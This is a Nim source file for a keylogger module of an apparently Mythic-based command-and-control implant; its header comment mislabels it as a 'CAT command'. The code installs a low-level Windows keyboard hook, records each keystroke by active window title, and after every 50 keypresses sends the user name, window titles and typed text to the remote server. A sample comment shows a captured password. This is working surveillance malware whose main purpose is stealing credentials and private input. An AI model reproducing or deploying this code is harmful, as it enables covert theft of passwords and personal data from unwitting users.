# This is the source for the CAT command
import ../utils
import json
import os
import winim/lean
import std/tables
import sequtils
import strutils


#[

{
    "task_id": "task uuid here",
    "keylogs": [
        {
            "user": "its-a-feature",
            "window_title": "Notepad - Untitled",
            "keystrokes": "my password is zer0c00l"
        }
    ]
}

]#

const MAX_KEYPRESSES = 50

#[
  Structs that are required to send the data to the remote server
]#
type
  KEYLOG_DATA = object
    user:  string
    window_title: string
    keystrokes: string
  KEYLOG_RE = object
    task_id: string
    keylogs: seq[KEYLOG_DATA]

  KEYLOG_RESPONSE = object
    action: string
    responses: seq[JsonNode]


var
  sendKeylog: KEYLOG_RE = KEYLOG_RE()
  lastWindowTitle: string
  keycount: int64
  stopKeylogger: bool = false
  isRunning: bool = false
  curThreadId: DWORD
  gConnection: ConnectionInformation
  gHook: HHOOK
  keylogDataEntry = initTable[string, string]()
  totalKeypresses = 0
type
    Keys = enum
        Modifiers = -65536
        None = 0
        LButton = 1
        RButton = 2
        Cancel = 3
        MButton = 4
        XButton1 = 5
        XButton2 = 6
        Back = 8
        Tab = 9
        LineFeed = 10
        Clear = 12
        #Return = 13
        Enter = 13
        ShiftKey = 16
        ControlKey = 17
        Menu = 18
        Pause = 19
        Capital = 20
        #CapsLock = 20
        KanaMode = 21
        #HanguelMode = 21
        #HangulMode = 21
        JunjaMode = 23
        FinalMode = 24
        #HanjaMode = 25
        KanjiMode = 25
        Escape = 27
        IMEConvert = 28
        IMENonconvert = 29
        IMEAccept = 30
        #IMEAceept = 30
        IMEModeChange = 31
        Space = 32
        #Prior = 33
        PageUp = 33
        #Next = 34
        PageDown = 34
        End = 35
        Home = 36
        Left = 37
        Up = 38
        Right = 39
        Down = 40
        Select = 41
        Print = 42
        Execute = 43
        #Snapshot = 44
        PrintScreen = 44
        Insert = 45
        Delete = 46
        Help = 47
        D0 = 48
        D1 = 49
        D2 = 50
        D3 = 51
        D4 = 52
        D5 = 53
        D6 = 54
        D7 = 55
        D8 = 56
        D9 = 57
        A = 65
        B = 66
        C = 67
        D = 68
        E = 69
        F = 70
        G = 71
        H = 72
        I = 73
        J = 74
        K = 75
        L = 76
        M = 77
        N = 78
        O = 79
        P = 80
        Q = 81
        R = 82
        S = 83
        T = 84
        U = 85
        V = 86
        W = 87
        X = 88
        Y = 89
        Z = 90
        LWin = 91
        RWin = 92
        Apps = 93
        Sleep = 95
        NumPad0 = 96
        NumPad1 = 97
        NumPad2 = 98
        NumPad3 = 99
        NumPad4 = 100
        NumPad5 = 101
        NumPad6 = 102
        NumPad7 = 103
        NumPad8 = 104
        NumPad9 = 105
        Multiply = 106
        Add = 107
        Separator = 108
        Subtract = 109
        Decimal = 110
        Divide = 111
        F1 = 112
        F2 = 113
        F3 = 114
        F4 = 115
        F5 = 116
        F6 = 117
        F7 = 118
        F8 = 119
        F9 = 120
        F10 = 121
        F11 = 122
        F12 = 123
        F13 = 124
        F14 = 125
        F15 = 126
        F16 = 127
        F17 = 128
        F18 = 129
        F19 = 130
        F20 = 131
        F21 = 132
        F22 = 133
        F23 = 134
        F24 = 135
        NumLock = 144
        Scroll = 145
        LShiftKey = 160
        RShiftKey = 161
        LControlKey = 162
        RControlKey = 163
        LMenu = 164
        RMenu = 165
        BrowserBack = 166
        BrowserForward = 167
        BrowserRefresh = 168
        BrowserStop = 169
        BrowserSearch = 170
        BrowserFavorites = 171
        BrowserHome = 172
        VolumeMute = 173
        VolumeDown = 174
        VolumeUp = 175
        MediaNextTrack = 176
        MediaPreviousTrack = 177
        MediaStop = 178
        MediaPlayPause = 179
        LaunchMail = 180
        SelectMedia = 181
        LaunchApplication1 = 182
        LaunchApplication2 = 183
        OemSemicolon = 186
        #Oem1 = 186
        Oemplus = 187
        Oemcomma = 188
        OemMinus = 189
        OemPeriod = 190
        OemQuestion = 191
        #Oem2 = 191
        Oemtilde = 192
        #Oem3 = 192
        OemOpenBrackets = 219
        #Oem4 = 219
        OemPipe = 220
        #Oem5 = 220
        OemCloseBrackets = 221
        #Oem6 = 221
        OemQuotes = 222
        #Oem7 = 222
        Oem8 = 223
        OemBackslash = 226
        #Oem102 = 226
        ProcessKey = 229
        Packet = 231
        Attn = 246
        Crsel = 247
        Exsel = 248
        EraseEof = 249
        Play = 250
        Zoom = 251
        NoName = 252
        Pa1 = 253
        OemClear = 254
        KeyCode = 65535
        Shift = 65536
        Control = 131072
        Alt = 262144

var
    KeyDict = {
        Keys.Attn: "[Attn]",
        Keys.Clear: "[Clear]",
        Keys.Down: "[Down]",
        Keys.Up: "[Up]",
        Keys.Left: "[Left]",
        Keys.Right: "[Right]",
        Keys.Escape: "[Escape]",
        Keys.Tab: "[Tab]",
        Keys.LWin: "[LeftWin]",
        Keys.RWin: "[RightWin]",
        Keys.PrintScreen: "[PrintScreen]",
        Keys.D0: "0",
        Keys.D1: "1",
        Keys.D2: "2",
        Keys.D3: "3",
        Keys.D4: "4",
        Keys.D5: "5",
        Keys.D6: "6",
        Keys.D7: "7",
        Keys.D8: "8",
        Keys.D9: "9",
        Keys.Space: " ",
        Keys.NumLock: "[NumLock]",
        Keys.Alt: "[Alt]",
        Keys.LControlKey: "[LeftControl]",
        Keys.RControlKey: "[RightControl]",
        #Keys.CapsLock: "[CapsLock]",
        Keys.Delete: "[Delete]",
        Keys.Enter: "[Enter]",
        Keys.Divide: "/",
        Keys.Multiply: "*",
        Keys.Add: "+",
        Keys.Subtract: "-",
        Keys.PageDown: "[PageDown]",
        Keys.PageUp: "[PageUp]",
        Keys.End: "[End]",
        Keys.Insert: "[Insert]",
        Keys.Decimal: ".",
        Keys.OemSemicolon: ";",
        Keys.Oemtilde: "`",
        Keys.Oemplus: "=",
        Keys.OemMinus: "-",
        Keys.Oemcomma: ",",
        Keys.OemPeriod: ".",
        Keys.OemPipe: "\\",
        Keys.OemQuotes: "\"",
        Keys.OemCloseBrackets: "]",
        Keys.OemOpenBrackets: "[",
        Keys.Home: "[Home]",
        Keys.Back: "[Backspace]",
        Keys.NumPad0: "0",
        Keys.NumPad1: "1",
        Keys.NumPad2: "2",
        Keys.NumPad3: "3",
        Keys.NumPad4: "4",
        Keys.NumPad5: "5",
        Keys.NumPad6: "6",
        Keys.NumPad7: "7",
        Keys.NumPad8: "8",
        Keys.NumPad9: "9",
    }.toTable()

    KeyDictShift = {
        Keys.D0: ")",
        Keys.D1: "!",
        Keys.D2: "@",
        Keys.D3: "#",
        Keys.D4: "$",
        Keys.D5: "%",
        Keys.D6: "^",
        Keys.D7: "&",
        Keys.D8: "*",
        Keys.D9: "(",
        Keys.OemSemicolon: ":",
        Keys.Oemtilde: "~",
        Keys.Oemplus: "+",
        Keys.OemMinus: "_",
        Keys.Oemcomma: "<",
        Keys.OemPeriod: ">",
        Keys.OemPipe: "|",
        Keys.OemQuotes: "'",
        Keys.OemCloseBrackets: "",
        Keys.OemOpenBrackets: "",
    }.toTable()
#[
  Function to obtain the currently active Window Title
]#
proc GetActiveWindowTitle(): string =
    var capacity: int32 = 256
    var builder: LPWSTR = newString(capacity)
    var wHandle = GetForegroundWindow()
    defer: CloseHandle(wHandle)
    GetWindowText(wHandle, builder, capacity)
    return $builder

proc sendKeylogData() =

  DBG("Sending Keylogs")
  for (winTitle, keystrokes) in keylogDataEntry.pairs():
    var tmpKeylogData = KEYLOG_DATA(user: getUser(), window_title: winTitle, keystrokes: keystrokes)
    sendKeylog.keylogs &= tmpKeylogData

  let resp = %* KEYLOG_RESPONSE(action: "post_response", responses: @[%*sendKeylog])
  discard sendAndRetrData($resp)
  # remove all previous data
  sendKeylog.keylogs = @[]

  for k in keylogDataEntry.keys():
    keylogDataEntry.del(k)




#[
  The Hook Callback, that gets executed on every keypress
]#
proc HookCallback*(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
    if nCode >= 0 and wParam == WM_KEYDOWN:
        var keypressed: string
        var kbdstruct: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
        var currentActiveWindow = GetActiveWindowTitle()
        var shifted: bool = (GetKeyState(160) < 0) or (GetKeyState(161) < 0)
        var keycode: Keys = cast[Keys](kbdstruct.vkCode)

        if shifted and (keycode in KeyDictShift):
            keypressed = KeyDictShift.getOrDefault(keycode)
        elif keycode in KeyDict:
            keypressed = KeyDict.getOrDefault(keycode)
        else:
            var capped: bool = (GetKeyState(20) != 0)
            if (capped and shifted) or not (capped or shifted):
                keypressed = $toLowerAscii(chr(ord(keycode)))
            else:
                keypressed = $toUpperAscii(chr(ord(keycode)))

        # Add to the hashmap
        if currentActiveWindow in keylogDataEntry:
          keylogDataEntry[currentActiveWindow] &= keypressed
        else:
          keylogDataEntry[currentActiveWindow] = keypressed

        totalKeypresses += 1

    if totalKeypresses >= MAX_KEYPRESSES:
      # send response to mythic server
      # remove old data and start fresh
      sendKeylogData()

    return CallNextHookEx(0, nCode, wParam, lParam)

#[
Short Command Description
  {"path": "anwiththestruct"}

]#
proc cmd_keylogger*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let action = params["action"].getStr()  # is either start or stop

  # Configure Output
  var
    output = ""
    taskOut = UserOutput(
          task_id: task.id,
          user_output: output,
          completed: true,
          )

    response = TaskResponse(
      action: "post_response",
      responses: @[]
    )

  # Do the Magic

  if action == "start" and not isRunning:
    isRunning = true # set the keylogger to be running
    curThreadId = GetCurrentThreadId()
    # setup keylogging struct
    sendKeylog.task_id = task.id
    sendKeylog.keylogs = @[]

    DBG("[*] Setting Keylogger Hook")
    gHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) HookCallback, 0,  0)

    if bool(gHook):
      DBG("[*] Placed Hook")

      var msg: MSG
      while GetMessage(msg.addr, 0, 0, 0) != 0:
        discard

      DBG("[*] Stop signal received, unhooked callback and quitting keylogger thread")

  elif action == "stop":
    if isRunning:
      DBG("[*] Keylogger is running, sending `stop` signal")
      # Send `stop` signal
      stopKeylogger = true
      isRunning = false

      # send the last remaining data to the server
      sendKeylogData()

      # a WM_QUIT forces GetMessage() to return 0, aka break the loop and quit the keylogger thread
      UnhookWindowsHookEx(gHook)
      PostThreadMessage(curThreadId, WM_QUIT, 0, 0)

      sleep(1000) # for some reason, both threads cannot terminate at the same time
    else:
      DBG("Keylogger is NOT running")

  # return the response
  response.responses.add(taskOut)
  return response

